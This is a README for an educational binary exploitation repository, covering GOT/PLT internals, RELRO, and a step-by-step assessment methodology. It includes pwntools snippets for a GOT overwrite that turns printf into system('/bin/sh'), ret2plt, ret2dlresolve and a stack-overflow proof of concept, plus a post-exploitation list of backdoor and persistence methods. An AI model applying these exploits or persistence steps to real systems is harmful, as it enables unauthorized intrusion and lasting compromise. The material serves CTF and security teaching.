# Binary Exploitation Mastery

> **Elite Offensive Security Research & Systems Architecture**  
> A comprehensive educational repository covering Computer Architecture, Binary Analysis, and Reverse Engineering

---

## 📚 Repository Structure

```
binary-exploitation-mastery/
├── architecture/          # CPU architectures, memory models, calling conventions
│   ├── x86/              # 32-bit Intel architecture
│   ├── x64/              # 64-bit Intel/AMD architecture
│   ├── ARM/              # 32-bit ARM architecture
│   ├── ARM64/            # 64-bit ARM (AArch64)
│   ├── MIPS/             # MIPS architecture
│   └── Memory_Layout/    # Stack, heap, and memory organization
├── vulnerabilities/       # Core exploitation techniques
│   ├── Stack_Overflow/   # Buffer overflow exploitation
│   ├── Heap_Corruption/  # Heap metadata manipulation
│   ├── UAF/              # Use-After-Free vulnerabilities
│   ├── Dangling_Pointers/# Pointer lifetime issues
│   └── Format_Strings/   # Format string vulnerabilities
├── advanced_techniques/   # Advanced exploitation methods
│   ├── ROP/              # Return-Oriented Programming
│   ├── JOP/              # Jump-Oriented Programming
│   └── SROP/             # Sigreturn-Oriented Programming
├── analysis_tools/        # Practical tooling and workflows
│   ├── GDB_Scripts/      # Debugging automation
│   └── Recon_Cheatsheet/ # Reconnaissance methodology
└── crypto_reversing/      # Cryptographic analysis
    ├── XOR/              # XOR cipher identification
    └── AES_ECB_patterns/ # ECB mode detection
```

---

## 🔧 Understanding GOT & PLT (Essential for CTF)

### What are GOT and PLT?

The **Global Offset Table (GOT)** and **Procedure Linkage Table (PLT)** are mechanisms used in dynamically linked ELF binaries to resolve external function addresses at runtime.

#### PLT (Procedure Linkage Table)

**Purpose:** Stub code that redirects calls to external functions

**Location:** `.plt` section (Read + Execute)

**How it works:**
```asm
; First call to printf@plt
printf@plt:
    jmp    [printf@GOT]      ; Jump to address in GOT
    push   relocation_index  ; If GOT not resolved, push index
    jmp    _dl_runtime_resolve  ; Call dynamic linker
```

#### GOT (Global Offset Table)

**Purpose:** Stores actual addresses of external functions

**Location:** `.got.plt` section (Read + Write)

**Initial State:** Contains address of PLT stub (lazy binding)

**After Resolution:** Contains actual libc function address

### Memory Layout

```
Code Segment (.text)
┌─────────────────────────────────────┐
│  main:                              │
│    call printf@plt  ────────┐       │
└─────────────────────────────│───────┘
                              │
PLT (.plt) - Read+Execute     │
┌─────────────────────────────▼───────┐
│  printf@plt:                        │
│    jmp [printf@GOT]  ───────┐       │
│    push 0                   │       │
│    jmp resolver             │       │
└─────────────────────────────│───────┘
                              │
GOT (.got.plt) - Read+Write   │
┌─────────────────────────────▼───────┐
│  printf@GOT:                        │
│    0x00007ffff7a62800  ←────────────┤ (libc printf address)
│    (or PLT stub if not resolved)    │
└─────────────────────────────────────┘
```

### Lazy Binding Process

**First Call:**
```
1. main() calls printf@plt
2. printf@plt jumps to [printf@GOT]
3. GOT contains PLT stub address (not resolved yet)
4. Jumps back to PLT resolver
5. Dynamic linker resolves printf address
6. Updates printf@GOT with real address
7. Jumps to printf in libc
```

**Subsequent Calls:**
```
1. main() calls printf@plt
2. printf@plt jumps to [printf@GOT]
3. GOT contains real printf address
4. Directly jumps to libc printf (fast!)
```

### GOT/PLT Attacks

#### 1. GOT Overwrite (Classic CTF Technique)

**Concept:** Overwrite GOT entry to redirect function calls

**Requirements:**
- Write primitive (buffer overflow, format string)
- Partial RELRO or No RELRO (GOT is writable)

**Example Attack:**
```python
# Overwrite printf@GOT with system address
# Next printf call → system() instead!

from pwn import *

binary = ELF('./vuln')
libc = ELF('./libc.so.6')

# Leak libc address
printf_got = binary.got['printf']
# ... leak printf address via format string ...

# Calculate system address
libc_base = leaked_printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']

# Overwrite printf@GOT
payload = fmtstr_payload(offset, {printf_got: system_addr})

# Trigger: printf("/bin/sh") → system("/bin/sh")
```

**Memory State:**
```
Before Attack:
printf@GOT: 0x7ffff7a62800 (printf in libc)

After Attack:
printf@GOT: 0x7ffff7a3ada0 (system in libc)

Result: printf(user_input) → system(user_input) → Shell!
```

#### 2. ret2plt (Return to PLT)

**Concept:** Return to PLT stub to call libc functions without knowing addresses

**Use Case:** No ASLR or partial ASLR (code segment not randomized)

**Example:**
```python
# Call system@plt with "/bin/sh" argument
payload = b"A" * offset
payload += p64(pop_rdi_ret)      # ROP gadget
payload += p64(binsh_addr)       # "/bin/sh" string
payload += p64(binary.plt['system'])  # system@plt
```

#### 3. ret2_dl_resolve (Advanced)

**Concept:** Manually trigger dynamic linker to resolve arbitrary functions

**Use Case:** No libc leak, limited ROP gadgets

**Steps:**
1. Craft fake relocation structure
2. Call `_dl_runtime_resolve` with fake index
3. Dynamic linker resolves attacker-controlled function

**CTF Example:**
```python
# Force dynamic linker to resolve system()
dlresolve = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])
rop.raw(dlresolve.payload)
```

### Viewing GOT/PLT

#### Using objdump
```bash
# View PLT entries
objdump -d -j .plt binary

# View GOT entries
objdump -R binary

# Output:
# OFFSET           TYPE              VALUE
# 0000000000404018 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
# 0000000000404020 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
```

#### Using GDB (GEF/Pwndbg)
```bash
gdb ./binary
(gdb) got

# Output:
# GOT protection: Partial RELRO
# [0x404018] printf@GLIBC_2.2.5  →  0x7ffff7a62800
# [0x404020] system@GLIBC_2.2.5  →  0x401036 (not resolved)
```

#### Using pwntools
```python
binary = ELF('./vuln')
print(hex(binary.got['printf']))  # GOT address
print(hex(binary.plt['printf']))  # PLT address
print(hex(binary.symbols['printf']))  # Symbol address (if not stripped)
```

### RELRO Protection

| RELRO Type | GOT Writable? | Exploitation |
|-----------|---------------|--------------|
| **No RELRO** | ✓ Yes | Easy GOT overwrite |
| **Partial RELRO** | ✓ Yes (.got.plt) | GOT overwrite possible |
| **Full RELRO** | ✗ No | GOT read-only, use other techniques |

**Check RELRO:**
```bash
checksec --file=binary
# RELRO: Full RELRO (hardest)
# RELRO: Partial RELRO (common in CTF)
# RELRO: No RELRO (easiest)
```

### CTF Tips

1. **Leak libc via GOT:** Read GOT entries to leak libc addresses
2. **Overwrite GOT:** Use format string or heap overflow to redirect functions
3. **ret2plt:** Call PLT stubs when you don't know libc addresses
4. **One-gadget:** Overwrite GOT with one-gadget address for instant shell
5. **GOT hijacking:** Chain multiple GOT overwrites for complex exploits

---

> **Note: Why not call the GOT address directly?**
>
> I know you might be wondering why not directly call GOT. Here is why:
> 1. **Indirection:** The GOT entry stores the *address* of the target function. If you jump to the GOT address itself, the CPU will attempt to execute the pointer value as machine code, rather than jumping to where the pointer points.
> 2. **Memory Permissions:** The GOT is part of the data segment (RW), which is typically marked as Non-Executable (NX).
> 3. **The PLT's Role:** The PLT contains the executable instructions (e.g., `jmp QWORD PTR [rip + offset]`) necessary to dereference the GOT pointer and jump to the actual function code.


---

## 🎯 Binary Assessment Methodology

This workflow represents the **Standard Operating Procedure** for elite binary analysts, from initial reconnaissance to post-exploitation.

### Phase 1: Reconnaissance (The "Black Box")

**Objective:** Understand the target's nature before execution.

#### 1.1 File Classification
```bash
file target_binary
# Determine: Architecture (x86/x64/ARM), Linking (static/dynamic), Stripped status
```

**Expected Output:**
```
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

#### 1.2 Security Mitigations (Checksec)
```bash
checksec --file=target_binary
```

**Key Protections:**
| Protection | Description | Exploitation Impact |
|-----------|-------------|---------------------|
| **NX/DEP** | Non-Executable Stack | Requires ROP (Return-Oriented Programming) |
| **ASLR** | Address Space Layout Randomization | Requires information leaks |
| **Canary** | Stack Smash Protection | Requires leak or brute-force |
| **PIE** | Position Independent Executable | Code segment randomization |
| **RELRO** | Relocation Read-Only | Prevents GOT overwrite (Full RELRO) |

---

### Phase 2: Static Analysis (Code Review / Disassembly)

**Objective:** Analyze the binary without executing it.

#### 2.1 Strings Analysis
```bash
strings target_binary | grep -E "(password|admin|flag|key)"
floss target_binary  # For obfuscated strings
```

**Purpose:** Find hardcoded credentials, IP addresses, debug symbols, or interesting function names.

#### 2.2 Control Flow Graph (CFG)
**Tools:** Ghidra, IDA Pro, Binary Ninja, radare2

**Workflow:**
1. Open binary in disassembler
2. Locate `main()` function (or `_start` if stripped)
3. Map out key subroutines and their relationships
4. Identify cross-references to dangerous functions

#### 2.3 Sink Identification
**Dangerous Functions to Track:**

| Function | Vulnerability Type | Why Dangerous |
|----------|-------------------|---------------|
| `strcpy()` | Stack Overflow | No bounds checking |
| `gets()` | Stack Overflow | Reads unlimited input |
| `sprintf()` | Stack Overflow | No size limit |
| `printf(user_input)` | Format String | Direct format string control |
| `system()` | Command Injection | Executes shell commands |
| `malloc()/free()` | Heap Corruption | Memory management errors |

#### 2.4 Logic Mapping
**Trace the input path:**
```
stdin → fgets() → buffer → strcpy() → local_var → return
```

---

### Phase 3: Dynamic Analysis (Runtime Inspection)

**Objective:** Run the binary to confirm behavior and understanding.

#### 3.1 Behavioral Analysis
```bash
# Library calls
ltrace ./target_binary

# System calls
strace ./target_binary

# Network activity
strace -e trace=network ./target_binary
```

#### 3.2 Fuzzing
**Cyclic Pattern Generation:**
```bash
# Using pwntools
python3 -c "from pwn import *; print(cyclic(200))"

# Using Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

**Format String Fuzzing:**
```bash
echo "AAAA %x %x %x %x %x %x" | ./target_binary
```

#### 3.3 Debugging (GDB/GEF/Pwndbg)
```bash
gdb ./target_binary

# Essential GDB commands
(gdb) break main              # Set breakpoint at main
(gdb) run < input.txt         # Run with input file
(gdb) vmmap                   # View memory mappings (GEF/Pwndbg)
(gdb) x/20wx $esp             # Examine stack (x86)
(gdb) x/20gx $rsp             # Examine stack (x64)
(gdb) info registers          # View all registers
(gdb) disassemble main        # Disassemble function
```

**Stack Frame Inspection:**
```bash
(gdb) break *main+42          # Break at specific offset
(gdb) x/40wx $esp             # Dump 40 words from stack pointer
(gdb) find $esp, $esp+200, 0x41414141  # Search for pattern
```

---

### Phase 4: Vulnerability Triage & Exploitation

**Objective:** Confirm crash, determine exploitability, develop proof-of-concept.

#### 4.1 Crash Analysis
**Questions to Answer:**
1. **Is EIP/RIP controlled?** (Check register state at crash)
2. **Does a register point to user input?** (ESP/RSP, EAX/RAX)
3. **What is the exact offset to overwrite the return address?**

**Offset Calculation:**
```bash
# After crash with cyclic pattern
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62616164
# Output: [*] Exact match at offset 44
```

#### 4.2 Constraint Check
**Exploitation Decision Tree:**
```
NX Disabled?
├─ YES → Inject shellcode directly
└─ NO  → Use ROP (Return-Oriented Programming)

ASLR Enabled?
├─ YES → Leak addresses first (puts@GOT, __libc_start_main)
└─ NO  → Use hardcoded addresses

Canary Present?
├─ YES → Leak canary or brute-force (fork servers)
└─ NO  → Direct overflow
```

#### 4.3 Exploit Strategy

**Stack Overflow:**
```
[Buffer Padding] + [Return Address] + [Shellcode/ROP Chain]
```

**Heap Overflow:**
```
Overflow chunk → Corrupt fd/bk pointers → Trigger unlink → Arbitrary write
```

**Use-After-Free:**
```
Free object → Reallocate with malicious data → Trigger function pointer
```

#### 4.4 PoC Development
**Example (Stack Overflow with pwntools):**
```python
from pwn import *

# Configuration
binary = ELF('./vulnerable_binary')
p = process(binary.path)

# Exploitation
offset = 44
ret_addr = p64(0xdeadbeef)  # Address of shellcode/gadget

payload = b"A" * offset      # Padding to reach return address
payload += ret_addr          # Overwrite return address

p.sendline(payload)
p.interactive()
```

---

### Phase 5: Post-Exploitation

#### 5.1 Privilege Escalation
**SUID Binary Exploitation:**
```bash
# Check if binary has SUID bit
ls -la vulnerable_binary
# -rwsr-xr-x  (SUID set - runs as owner, typically root)

# Successful exploitation yields root shell
```

#### 5.2 Persistence
- **Backdoor Installation:** Modify `/etc/passwd`, add SSH keys
- **Rootkit Deployment:** Kernel module loading (if applicable)
- **Lateral Movement:** Pivot to other systems in network

---

## 🛠️ Essential Tools

| Category | Tools |
|----------|-------|
| **Disassemblers** | Ghidra, IDA Pro, Binary Ninja, radare2 |
| **Debuggers** | GDB (with GEF/Pwndbg/peda), WinDbg, x64dbg |
| **Dynamic Analysis** | ltrace, strace, Frida, DynamoRIO |
| **Exploitation** | pwntools, Metasploit, ROPgadget, ropper |
| **Reverse Engineering** | Hopper, Cutter, angr, Triton |

---

## 📖 Learning Path

1. **Start Here:** [Architecture Fundamentals](./architecture/)
2. **Core Skills:** [Vulnerability Modules](./vulnerabilities/)
3. **Practical Tools:** [Analysis Workflows](./analysis_tools/)
4. **Advanced Topics:** [Crypto Reversing](./crypto_reversing/)

---

## ⚠️ Legal Disclaimer

This repository is for **educational purposes only**. All techniques should be practiced in:
- Authorized CTF competitions
- Personal lab environments
- Bug bounty programs with explicit permission

**Unauthorized access to computer systems is illegal.**

---

## 📝 Contributing

Contributions are welcome! Please ensure:
- All assembly is verified against official architecture manuals
- Code samples include detailed comments
- ASCII diagrams are properly formatted
- Exploit scripts are tested and functional

---

## 📚 References

- [Intel® 64 and IA-32 Architectures Software Developer's Manual](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)
- [ARM Architecture Reference Manual](https://developer.arm.com/documentation/)
- [Glibc Malloc Internals](https://sourceware.org/glibc/wiki/MallocInternals)
- [Phrack Magazine](http://phrack.org/)
- [Project Zero Blog](https://googleprojectzero.blogspot.com/)

---

**Author:** Elite Offensive Security Researcher  
**License:** MIT  
**Last Updated:** 2025-12-29
